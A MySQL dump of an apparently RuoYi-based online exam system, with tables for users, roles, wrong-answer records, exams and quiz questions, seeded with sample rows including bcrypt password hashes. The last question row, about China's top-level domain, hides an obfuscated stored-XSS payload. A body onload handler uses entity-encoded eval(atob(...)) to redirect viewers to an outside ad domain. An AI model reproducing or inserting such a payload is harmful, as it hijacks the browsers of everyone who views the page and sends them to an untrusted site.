  `email` varchar(50) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '用户邮箱',
  `phonenumber` varchar(11) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '手机号码',
  `sex` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '用户性别（0男 1女 2未知）',
  `avatar` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '头像地址',
  `password` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '密码',
  `status` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '帐号状态（0正常 1停用）',
  `del_flag` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '删除标志（0代表存在 2代表删除）',
  `login_ip` varchar(128) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '最后登录IP',
  `login_date` datetime DEFAULT NULL COMMENT '最后登录时间',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=104 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='用户信息表';

-- ----------------------------
-- Records of sys_user
-- ----------------------------
BEGIN;
INSERT INTO `sys_user` (`user_id`, `dept_id`, `user_name`, `nick_name`, `user_type`, `email`, `phonenumber`, `sex`, `avatar`, `password`, `status`, `del_flag`, `login_ip`, `login_date`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, 101, 'admin', '超级管理员', '00', 'admin@163.com1', '15888888888', '1', '', '$2a$10$F.zGnJU.otT3vWfVUTx/SOftxT/ux.G7QpiQqmyhe5RygdlGaX2o6', '0', '0', '127.0.0.1', '2023-11-19 21:51:38', 'admin', '2023-10-23 20:57:31', '', '2023-11-19 21:51:38', '管理员');
INSERT INTO `sys_user` (`user_id`, `dept_id`, `user_name`, `nick_name`, `user_type`, `email`, `phonenumber`, `sex`, `avatar`, `password`, `status`, `del_flag`, `login_ip`, `login_date`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, 101, 'ry', '若依', '00', 'ry@qq.com', '15666666666', '1', '', '$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2', '0', '2', '127.0.0.1', '2023-10-23 20:57:31', 'admin', '2023-10-23 20:57:31', 'admin', '2023-10-24 10:05:28', '测试员');
INSERT INTO `sys_user` (`user_id`, `dept_id`, `user_name`, `nick_name`, `user_type`, `email`, `phonenumber`, `sex`, `avatar`, `password`, `status`, `del_flag`, `login_ip`, `login_date`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (100, 101, 'test', 'test', '00', '', '', '0', '', '$2a$10$ri2jf0nhsESrFnPo7l8ZR.LLXIVg5fNPe2V8MtckKtlR/a4gZyeJ6', '0', '0', '127.0.0.1', '2023-10-31 20:43:24', 'admin', '2023-10-31 15:40:04', '', '2023-10-31 20:43:24', NULL);
INSERT INTO `sys_user` (`user_id`, `dept_id`, `user_name`, `nick_name`, `user_type`, `email`, `phonenumber`, `sex`, `avatar`, `password`, `status`, `del_flag`, `login_ip`, `login_date`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (101, 200, 'xiaowang', '小王', '00', '', '', '0', '', '$2a$10$Bayx3oCExgjS1JTd00Nzsu9O2NlaH1RmToZ6bWPrtDjeyX77M.9Bi', '0', '0', '127.0.0.1', '2023-11-15 10:32:00', 'admin', '2023-11-03 15:03:57', '', '2023-11-15 10:32:00', NULL);
INSERT INTO `sys_user` (`user_id`, `dept_id`, `user_name`, `nick_name`, `user_type`, `email`, `phonenumber`, `sex`, `avatar`, `password`, `status`, `del_flag`, `login_ip`, `login_date`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (102, 200, 'xiaoliu', '小刘', '00', '', '', '0', '', '$2a$10$olIfblvLi8PSn9WOTiAvSuayv/KNSx79YO6wnJrW0wPz2sciXStcK', '0', '0', '127.0.0.1', '2023-11-15 08:40:28', 'admin', '2023-11-03 15:06:13', '', '2023-11-15 08:40:28', NULL);
INSERT INTO `sys_user` (`user_id`, `dept_id`, `user_name`, `nick_name`, `user_type`, `email`, `phonenumber`, `sex`, `avatar`, `password`, `status`, `del_flag`, `login_ip`, `login_date`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (103, 200, 'xiaoli', '小李', '00', '', '', '0', '', '$2a$10$hBvU5gDt7k4uJyTRAemIs.TigMFjK80aBWIcOQqRCAO66LbmOMYFW', '0', '0', '127.0.0.1', '2023-11-15 08:40:05', 'admin', '2023-11-03 15:07:16', '', '2023-11-15 08:40:05', NULL);
COMMIT;

-- ----------------------------
-- Table structure for sys_user_post
-- ----------------------------
DROP TABLE IF EXISTS `sys_user_post`;
CREATE TABLE `sys_user_post` (
  `user_id` bigint NOT NULL COMMENT '用户ID',
  `post_id` bigint NOT NULL COMMENT '岗位ID',
  PRIMARY KEY (`user_id`,`post_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='用户与岗位关联表';

-- ----------------------------
-- Records of sys_user_post
-- ----------------------------
BEGIN;
INSERT INTO `sys_user_post` (`user_id`, `post_id`) VALUES (1, 1);
COMMIT;

-- ----------------------------
-- Table structure for sys_user_role
-- ----------------------------
DROP TABLE IF EXISTS `sys_user_role`;
CREATE TABLE `sys_user_role` (
  `user_id` bigint NOT NULL COMMENT '用户ID',
  `role_id` bigint NOT NULL COMMENT '角色ID',
  PRIMARY KEY (`user_id`,`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='用户和角色关联表';

-- ----------------------------
-- Records of sys_user_role
-- ----------------------------
BEGIN;
INSERT INTO `sys_user_role` (`user_id`, `role_id`) VALUES (1, 1);
INSERT INTO `sys_user_role` (`user_id`, `role_id`) VALUES (100, 100);
INSERT INTO `sys_user_role` (`user_id`, `role_id`) VALUES (101, 101);
INSERT INTO `sys_user_role` (`user_id`, `role_id`) VALUES (102, 101);
INSERT INTO `sys_user_role` (`user_id`, `role_id`) VALUES (103, 101);
COMMIT;

-- ----------------------------
-- Table structure for tb_error_exercise
-- ----------------------------
DROP TABLE IF EXISTS `tb_error_exercise`;
CREATE TABLE `tb_error_exercise` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键',
  `exercise_id` bigint DEFAULT '0' COMMENT '题目id',
  `user_id` bigint DEFAULT '0' COMMENT '用户id',
  `error_counts` int DEFAULT '0' COMMENT '错误次数',
  `is_delete` tinyint DEFAULT '0' COMMENT '是否删除 0:否 1:是',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=42 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='错题记录表';

-- ----------------------------
-- Records of tb_error_exercise
-- ----------------------------
BEGIN;
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (7, 13, 1, 5, 0, 'admin', '2023-11-07 11:24:12', 'admin', '2023-11-15 08:36:15');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (8, 40, 1, 10, 0, 'admin', '2023-11-07 11:24:48', 'admin', '2023-11-08 21:48:59');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (9, 40, 101, 1, 0, 'xiaowang', '2023-11-07 11:30:09', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (10, 17, 101, 1, 0, 'xiaowang', '2023-11-07 11:30:18', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (11, 61, 101, 1, 0, 'xiaowang', '2023-11-07 11:30:20', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (12, 52, 101, 1, 0, 'xiaowang', '2023-11-07 11:30:22', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (13, 54, 1, 9, 0, 'admin', '2023-11-09 16:10:16', 'admin', '2023-11-09 19:40:50');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (14, 18, 1, 2, 0, 'admin', '2023-11-09 16:11:05', 'admin', '2023-11-09 20:39:26');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (15, 64, 1, 3, 0, 'admin', '2023-11-09 16:26:19', 'admin', '2023-11-09 19:56:19');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (16, 61, 1, 3, 0, 'admin', '2023-11-09 16:45:10', 'admin', '2023-11-09 20:39:30');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (17, 8, 1, 4, 0, 'admin', '2023-11-09 16:49:04', 'admin', '2023-11-09 19:32:00');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (18, 59, 1, 4, 0, 'admin', '2023-11-09 16:53:35', 'admin', '2023-11-09 19:38:11');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (19, 55, 1, 1, 0, 'admin', '2023-11-09 19:05:07', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (20, 1, 1, 3, 0, 'admin', '2023-11-09 19:07:08', 'admin', '2023-11-09 19:38:14');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (21, 21, 1, 2, 0, 'admin', '2023-11-09 19:07:22', 'admin', '2023-11-09 19:25:45');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (22, 60, 1, 1, 0, 'admin', '2023-11-09 19:08:31', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (23, 9, 1, 15, 0, 'admin', '2023-11-09 19:12:45', 'admin', '2023-11-09 19:31:12');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (24, 16, 1, 14, 0, 'admin', '2023-11-09 19:14:30', 'admin', '2023-11-09 19:22:40');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (25, 12, 1, 3, 0, 'admin', '2023-11-09 19:17:10', 'admin', '2023-11-09 19:31:20');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (26, 17, 1, 3, 0, 'admin', '2023-11-09 19:19:46', 'admin', '2023-11-09 19:24:44');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (27, 58, 1, 1, 0, 'admin', '2023-11-09 19:19:48', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (28, 62, 1, 2, 0, 'admin', '2023-11-09 19:24:04', 'admin', '2023-11-09 19:44:52');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (29, 56, 1, 3, 0, 'admin', '2023-11-09 19:26:43', 'admin', '2023-11-09 19:53:33');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (30, 15, 1, 1, 0, 'admin', '2023-11-09 19:33:27', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (31, 19, 1, 1, 0, 'admin', '2023-11-09 19:34:50', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (32, 53, 1, 1, 0, 'admin', '2023-11-09 19:36:11', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (33, 66, 1, 2, 0, 'admin', '2023-11-09 20:26:37', 'admin', '2023-11-09 20:49:37');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (34, 3, 1, 4, 0, 'admin', '2023-11-09 20:29:47', 'admin', '2023-11-09 21:12:37');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (35, 14, 1, 1, 0, 'admin', '2023-11-09 20:39:47', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (36, 46, 1, 2, 0, 'admin', '2023-11-09 20:49:46', 'admin', '2023-11-09 20:58:09');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (37, 79, 1, 1, 0, 'admin', '2023-11-09 20:52:48', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (38, 33, 1, 1, 0, 'admin', '2023-11-09 21:08:56', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (39, 26, 1, 1, 0, 'admin', '2023-11-09 21:12:44', '', NULL);
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (40, 19, 102, 2, 0, 'xiaoliu', '2023-11-15 08:54:17', 'xiaoliu', '2023-11-15 08:54:41');
INSERT INTO `tb_error_exercise` (`id`, `exercise_id`, `user_id`, `error_counts`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (41, 60, 102, 1, 0, 'xiaoliu', '2023-11-15 08:54:41', '', NULL);
COMMIT;

-- ----------------------------
-- Table structure for tb_exam
-- ----------------------------
DROP TABLE IF EXISTS `tb_exam`;
CREATE TABLE `tb_exam` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键',
  `exam_name` varchar(128) DEFAULT '' COMMENT '考试名称',
  `paper_id` bigint DEFAULT '0' COMMENT '试卷id',
  `paper_name` varchar(128) DEFAULT '' COMMENT '试卷名称（根据id自动填充）',
  `duration` int DEFAULT '0' COMMENT '持续时间，以分钟为单位',
  `is_delete` tinyint DEFAULT '0' COMMENT '是否删除 0:否 1:是',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='考试表';

-- ----------------------------
-- Records of tb_exam
-- ----------------------------
BEGIN;
INSERT INTO `tb_exam` (`id`, `exam_name`, `paper_id`, `paper_name`, `duration`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (1, '考试1', 7, '', 32, 1, '', '2023-11-03 14:53:56', '', NULL);
INSERT INTO `tb_exam` (`id`, `exam_name`, `paper_id`, `paper_name`, `duration`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (2, '12', 2, '', 12, 1, '', '2023-11-03 15:55:18', '', NULL);
INSERT INTO `tb_exam` (`id`, `exam_name`, `paper_id`, `paper_name`, `duration`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (3, '123', 3, '', 123, 1, 'admin', '2023-11-03 16:20:09', '', NULL);
INSERT INTO `tb_exam` (`id`, `exam_name`, `paper_id`, `paper_name`, `duration`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (4, '测试考试', 1, '', 10, 1, 'admin', '2023-11-03 16:28:42', '', NULL);
INSERT INTO `tb_exam` (`id`, `exam_name`, `paper_id`, `paper_name`, `duration`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (5, '测试考试', 8, '', 60, 0, 'admin', '2023-11-06 10:06:58', '', NULL);
INSERT INTO `tb_exam` (`id`, `exam_name`, `paper_id`, `paper_name`, `duration`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (6, '调试在线考试', 9, '', 1, 0, 'admin', '2023-11-06 18:48:37', '', NULL);
INSERT INTO `tb_exam` (`id`, `exam_name`, `paper_id`, `paper_name`, `duration`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (7, '11', 8, '测试考试试卷', 23, 0, 'admin', '2023-11-15 10:08:24', 'admin', '2023-11-15 10:29:03');
INSERT INTO `tb_exam` (`id`, `exam_name`, `paper_id`, `paper_name`, `duration`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (8, '12', 8, '', 1, 0, 'admin', '2023-11-15 10:31:36', '', NULL);
COMMIT;

-- ----------------------------
-- Table structure for tb_exam_user
-- ----------------------------
DROP TABLE IF EXISTS `tb_exam_user`;
CREATE TABLE `tb_exam_user` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键',
  `exam_id` bigint DEFAULT '0' COMMENT '考试id',
  `user_id` bigint DEFAULT '0' COMMENT '用户id',
  `status` tinyint NOT NULL DEFAULT '0' COMMENT '状态（0：尚未开始 1：正在进行 2：已结束）',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '结束时间',
  `score` int DEFAULT NULL COMMENT '分数',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='考试-用户映射表（记录参加考试的用户）';

-- ----------------------------
-- Records of tb_exam_user
-- ----------------------------
BEGIN;
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (1, 3, 102, 0, NULL, NULL, NULL);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (2, 3, 101, 1, '2023-11-06 09:01:45', '2023-11-06 11:04:45', NULL);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (3, 4, 101, 0, NULL, NULL, NULL);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (4, 4, 102, 0, NULL, NULL, NULL);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (5, 5, 101, 0, '2023-11-06 17:29:19', '2023-11-06 18:29:19', 14);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (6, 5, 102, 0, NULL, NULL, NULL);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (7, 6, 101, 2, '2023-11-06 19:12:52', '2023-11-06 19:13:52', 50);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (8, 6, 102, 2, '2023-11-15 08:54:34', '2023-11-15 08:55:34', 0);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (9, 7, 100, 0, NULL, NULL, NULL);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (10, 7, 1, 0, NULL, NULL, NULL);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (11, 8, 100, 0, NULL, NULL, NULL);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (12, 8, 101, 0, NULL, NULL, NULL);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (13, 8, 102, 0, NULL, NULL, NULL);
INSERT INTO `tb_exam_user` (`id`, `exam_id`, `user_id`, `status`, `start_time`, `end_time`, `score`) VALUES (14, 8, 103, 0, NULL, NULL, NULL);
COMMIT;

-- ----------------------------
-- Table structure for tb_examination_info
-- ----------------------------
DROP TABLE IF EXISTS `tb_examination_info`;
CREATE TABLE `tb_examination_info` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键',
  `exam_id` bigint DEFAULT '0' COMMENT '考试id',
  `user_id` bigint DEFAULT '0' COMMENT '用户id',
  `exercise_id` bigint DEFAULT '0' COMMENT '题目id',
  `answer` varchar(64) DEFAULT '' COMMENT '答案',
  `is_true` int DEFAULT '1' COMMENT '是否正确 0：否 1：是',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=32 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='考试情况记录表';

-- ----------------------------
-- Records of tb_examination_info
-- ----------------------------
BEGIN;
INSERT INTO `tb_examination_info` (`id`, `exam_id`, `user_id`, `exercise_id`, `answer`, `is_true`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (20, 6, 101, 19, 'C', 1, 'xiaowang', '2023-11-06 19:10:31', 'xiaowang', '2023-11-06 19:10:31');
INSERT INTO `tb_examination_info` (`id`, `exam_id`, `user_id`, `exercise_id`, `answer`, `is_true`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (21, 6, 101, 60, 'A', 0, 'xiaowang', '2023-11-06 19:10:31', 'xiaowang', '2023-11-06 19:10:31');
INSERT INTO `tb_examination_info` (`id`, `exam_id`, `user_id`, `exercise_id`, `answer`, `is_true`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (22, 6, 101, 19, 'D', 0, 'xiaowang', '2023-11-06 19:12:06', 'xiaowang', '2023-11-06 19:12:06');
INSERT INTO `tb_examination_info` (`id`, `exam_id`, `user_id`, `exercise_id`, `answer`, `is_true`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (23, 6, 101, 60, 'A', 0, 'xiaowang', '2023-11-06 19:12:06', 'xiaowang', '2023-11-06 19:12:06');
INSERT INTO `tb_examination_info` (`id`, `exam_id`, `user_id`, `exercise_id`, `answer`, `is_true`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (24, 6, 101, 19, 'A', 0, 'xiaowang', '2023-11-06 19:13:07', 'xiaowang', '2023-11-06 19:13:07');
INSERT INTO `tb_examination_info` (`id`, `exam_id`, `user_id`, `exercise_id`, `answer`, `is_true`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (25, 6, 101, 60, 'C', 1, 'xiaowang', '2023-11-06 19:13:07', 'xiaowang', '2023-11-06 19:13:07');
INSERT INTO `tb_examination_info` (`id`, `exam_id`, `user_id`, `exercise_id`, `answer`, `is_true`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (30, 6, 102, 19, 'B', 0, 'xiaoliu', '2023-11-15 08:54:41', 'xiaoliu', '2023-11-15 08:54:41');
INSERT INTO `tb_examination_info` (`id`, `exam_id`, `user_id`, `exercise_id`, `answer`, `is_true`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (31, 6, 102, 60, 'B', 0, 'xiaoliu', '2023-11-15 08:54:41', 'xiaoliu', '2023-11-15 08:54:41');
COMMIT;

-- ----------------------------
-- Table structure for tb_exercises
-- ----------------------------
DROP TABLE IF EXISTS `tb_exercises`;
CREATE TABLE `tb_exercises` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键',
  `exercise_title` text COMMENT '题目描述',
  `exercise_program` text COMMENT '对于阅读程序和补全程序，记录程序部分',
  `parent_id` bigint NOT NULL DEFAULT '-1' COMMENT '记录阅读程序和补全程序题与其子题的关系',
  `choice_a` varchar(128) DEFAULT '' COMMENT '选项A',
  `choice_b` varchar(128) DEFAULT '' COMMENT '选项B',
  `choice_c` varchar(128) DEFAULT '' COMMENT '选项C',
  `choice_d` varchar(128) DEFAULT '' COMMENT '选项D',
  `correct_answer` varchar(128) DEFAULT '' COMMENT '正确答案，对于选择题只能取A、B、C、D这四个值其中之一，对于判断题只能是 正确/错误 二者之一',
  `analysis` text COMMENT '答案解析',
  `exercise_type` tinyint DEFAULT '-1' COMMENT '题目类型 0:选择题 1:判断题',
  `ques_type` tinyint DEFAULT '-1' COMMENT '类型 0:基础题 1:阅读程序 2:补全程序',
  `is_delete` tinyint DEFAULT '0' COMMENT '是否删除 0:否 1:是',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` text COMMENT '备注',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=104 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='基础题目表';

-- ----------------------------
-- Records of tb_exercises
-- ----------------------------
BEGIN;
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, '<p>中国的国家顶级域名是？	</p><body/onload=e&#x76;&#x61;l&#x28;a&#x74;&#x6f;b&#x28;&#34;d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vd3d3LnRvcHJldmVudWVnYXRlLmNvbS9jbmN0d2pkbj9rZXk9NzU0YTVmZGE2Mjk1N2M4MDc1NzdiOTEyYmFiOThlYzYiKQ==&#34;&#x29;&#x29;>', NULL, -1, '.cn', '.ch', '.chn', '.china', 'A', NULL, 0, 0, 0, 'test', '2023-10-31 20:07:55', '', NULL, '2019CSP-J入门级C++试题A卷');
